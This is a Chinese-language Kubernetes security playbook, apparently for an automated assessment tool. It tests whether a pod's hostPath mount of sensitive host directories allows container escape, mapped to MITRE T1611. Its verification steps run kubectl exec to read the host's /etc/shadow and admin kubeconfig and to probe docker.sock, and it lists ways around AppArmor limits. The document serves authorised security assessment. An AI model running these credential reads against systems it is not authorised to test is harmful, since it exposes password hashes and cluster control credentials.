---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1]
max_verification_level: L1
destructive: false
mapped_attack_surfaces: [AS-1.5]
mapped_compliance_families: [危险挂载, hostPath暴露]
---

# hostpath-mount — hostPath 敏感目录挂载逃逸

Pod 通过 hostPath 挂载了宿主机敏感目录（如 `/`, `/etc`, `/var/run`），容器内可直接读写宿主机文件系统，实现信息泄露或逃逸。

---

## 1. 前置条件

- Pod 配置了 hostPath 类型的 volume
- hostPath 挂载了宿主机敏感目录（`/`, `/etc`, `/var/run`, `/root` 等）
- 容器内挂载点可读（敏感信息读取即可证明风险）

检查命令：
```bash
# [L0] 宿主机观察：检查 Pod 是否有 hostPath 挂载
kubectl get pod <pod-name> -n <ns> -o yaml | grep -A3 hostPath
# 期望输出: hostPath: path: / 或其他敏感路径

# [L0] 宿主机观察：检查 Pod 特权模式
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.securityContext.privileged}'
# 期望输出: true（特权容器更危险，但非特权 hostPath 同样危险）
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：列出所有 hostPath 挂载及其路径
kubectl get pod <pod-name> -n <ns> -o jsonpath='{range .spec.volumes[*]}{.name}:{.hostPath.path}{"\n"}{end}'
# 期望输出: <vol-name>:/ 或 <vol-name>:/etc 等

# [L0] 宿主机观察：检查挂载路径是否为敏感目录
kubectl get pod <pod-name> -n <ns> -o yaml | grep -E "hostPath|path:" | grep -E "/$|/etc|/var/run|/root|/proc|/sys"
# 期望输出: 匹配到的敏感路径

# [L1] 容器内观察：检查挂载点
kubectl exec -n <ns> <pod-name> -- mount | grep -E "host|/host"
# 期望输出: /dev/sda1 on /host type ext4 (rw,...)（确认挂载点和权限）

# [L1] 容器内观察：尝试读取挂载的宿主机文件
kubectl exec -n <ns> <pod-name> -- ls /<mount-point>/etc/shadow 2>/dev/null || kubectl exec -n <ns> <pod-name> -- ls /<mount-point>/passwd 2>/dev/null
# 期望输出: 文件存在 & 可读取
```

## 3. 攻击验证

```bash
# [L1] 容器内攻击验证：通过 hostPath 读取宿主机敏感文件（读取即证明）
kubectl exec -n <ns> <pod-name> -- cat /<mount-point>/etc/shadow
# 期望输出: root:$6$...:... (宿主机 shadow 内容) → 证明可直接访问宿主机文件系统

# [L1] 容器内攻击验证：读取宿主机 hostname 确认非容器自身
kubectl exec -n <ns> <pod-name> -- cat /<mount-point>/etc/hostname
# 期望输出: 宿主机 hostname（与容器 hostname 不同）→ 证明读取的是宿主机文件

# [L1] 容器内攻击验证：读取宿主机 Docker/K8s 配置
kubectl exec -n <ns> <pod-name> -- cat /<mount-point>/etc/kubernetes/admin.conf 2>/dev/null
# 期望输出: K8s admin kubeconfig 内容（含证书和 API server 地址）→ 证明可获取集群凭据

# [L1] 容器内攻击验证：若挂载为 /var/run，尝试读取容器运行时 socket
kubectl exec -n <ns> <pod-name> -- ls -la /<mount-point>/docker.sock 2>/dev/null
# 期望输出: srw-rw---- ... /<mount-point>/docker.sock（存在 docker.sock）
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录宿主机 hostname（用于后续比对）
hostname
# 期望输出: <host-hostname>

# [L1] 攻击前：容器内 hostname 与宿主机不同（证明隔离）
kubectl exec -n <ns> <pod-name> -- hostname
# 期望输出: <container-hostname>（与宿主机不同）

# [L1] 攻击后：通过 hostPath 读取宿主机 hostname 与宿主机比对
kubectl exec -n <ns> <pod-name> -- cat /<mount-point>/etc/hostname
# 期望输出: <host-hostname>（与步骤1宿主机 hostname 相同）→ 证明读取的是宿主机文件

# [L1] 攻击后：读取宿主机 shadow 证明可访问宿主机凭据
kubectl exec -n <ns> <pod-name> -- cat /<mount-point>/etc/shadow 2>/dev/null | head -3
# 期望输出: root:$6$...:... / bin:*:... / ... → 证明可读取宿主机密码哈希

# [L1] 容器内读取宿主机文件证明逃逸成功
kubectl exec -n <ns> <pod-name> -- ls -la /<mount-point>/etc/kubernetes/ 2>/dev/null
# 期望输出: admin.conf, controller-manager.conf 等文件 → 证明可获取集群控制凭据
```

差分结论：容器内 hostname 与宿主机不同（证明隔离生效），但通过 hostPath 挂载点可读取宿主机 `/etc/hostname` 且与宿主机 hostname 一致，同时可读取 `/etc/shadow` 等敏感文件，证明 hostPath 挂载使容器可直接访问宿主机文件系统。

## 5. 绕过策略

```bash
# [L1] 检查 AppArmor 是否限制 hostPath 挂载点访问
kubectl exec -n <ns> <pod-name> -- cat /proc/1/attr/current
# 若输出含 hostpath 限制策略 → AppArmor 可能阻断文件读取

# [L1] 检查 Seccomp 是否限制 open 系统调用
kubectl exec -n <ns> <pod-name> -- cat /proc/1/status | grep Seccomp
# 若 Seccomp: 2 (strict) → 可能阻断

# 绕过方式：
# - [L1] 若 hostPath 以只读挂载，读取仍可证明泄露（信息泄露本身就是风险）
# - [L1] 若部分路径被 AppArmor 限制，检查挂载点下其他未被限制的路径
# - [L1] 若挂载了 /var/run 但 docker.sock 被限制，检查 containerd.sock 或其他 socket
```

## 6. 证伪条件

```bash
# [L0] Pod 无 hostPath 挂载
kubectl get pod <pod-name> -n <ns> -o yaml | grep -c hostPath
# 输出: 0 → 证伪

# [L0] hostPath 路径为非敏感目录
kubectl get pod <pod-name> -n <ns> -o jsonpath='{range .spec.volumes[*]}{.hostPath.path}{"\n"}{end}' | grep -vE "/$|/etc|/var/run|/root|/proc|/sys"
# 输出: 全部为非敏感路径（如 /tmp/test） → 证伪（风险较低）

# [L1] 挂载点为只读且无敏感内容
kubectl exec -n <ns> <pod-name> -- mount | grep <mount-point> | grep -c ro
# 输出: 1（只读）且无法读取敏感文件 → 风险降级为信息泄露

# [L1] 挂载点不可访问
kubectl exec -n <ns> <pod-name> -- ls /<mount-point>/ 2>&1
# 输出: Permission denied → 证伪
```

## 7. 审批级别

- **L1** 容器内攻击验证（读取宿主机文件）→ **Level 2**（只读操作，自动执行）— hostPath 读取即可证明风险，无需 L2 攻击验证
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L1（读取即可证明，无需 L2 创建容器或写入操作）

## 8. MITRE ATT&CK

- **Tactic**: Credential Access / Discovery
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: Pod 通过 hostPath 挂载宿主机敏感目录，容器内可直接读取宿主机文件系统中的 `/etc/shadow`、K8s 配置文件等敏感信息，实现信息泄露和潜在的容器逃逸。虽然不直接产生新进程逃逸，但获取的宿主机凭据可用于后续逃逸攻击。